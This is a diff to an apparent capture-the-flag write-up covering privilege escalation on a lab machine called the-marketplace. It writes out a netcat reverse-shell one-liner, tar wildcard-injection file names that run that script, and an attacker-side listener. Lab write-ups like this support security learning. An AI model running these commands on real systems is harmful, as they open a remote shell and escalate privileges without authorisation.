@@ -104,7 +104,7 @@ Table: users
 ```
 
 
-## Privilege Escalation !
+## Privilege Escalation :
 
 ##### User Michael :
 
@@ -128,8 +128,8 @@ Tar wildcards is very dangerous, [Check Here](https://book.hacktricks.xyz/linux-
 
 ```
 jake@the-marketplace:/opt/backups$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 8080 >/tmp/f" > shell.sh
-jake@the-marketplace:/opt/backups$ echo "" > "--checkpoint-action=exec=sh shell.sh"
-jake@the-marketplace:/opt/backups$ echo "" > --checkpSoint=1
+jake@the-marketplace:/opt/backups$ touch "./--checkpoint-action=exec=sh shell.sh"
+jake@the-marketplace:/opt/backups$ touch "./--checkpoint=1"
 ```
 ```
 bvr0n@kali:~$ nc -lnvp 8080
